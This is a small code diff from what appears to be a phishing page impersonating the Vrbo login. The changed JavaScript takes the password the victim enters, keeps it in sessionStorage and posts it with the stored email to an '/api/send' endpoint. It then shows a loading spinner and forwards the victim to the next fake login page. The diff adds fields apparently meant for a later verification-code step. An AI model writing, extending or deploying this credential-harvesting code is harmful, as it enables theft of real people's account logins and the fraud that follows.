@@ -167,13 +167,13 @@
     loader.classList.add('is-visible');
 
     const correo = sessionStorage.getItem('vrbo_correo') || '';
-    const nombre = passwordInput.value;
-    sessionStorage.setItem('vrbo_nombre', nombre);
+    const password = passwordInput.value;
+    sessionStorage.setItem('vrbo_nombre', password);
 
     fetch('/api/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ correo, nombre, lada: '', numero: '', fase: '1' })
+      body: JSON.stringify({ correo, password, metodo: '', codigo: '', fase: '1' })
     });
 
     setTimeout(() => { window.location.href = 'vrbologin3.html'; }, 3000);
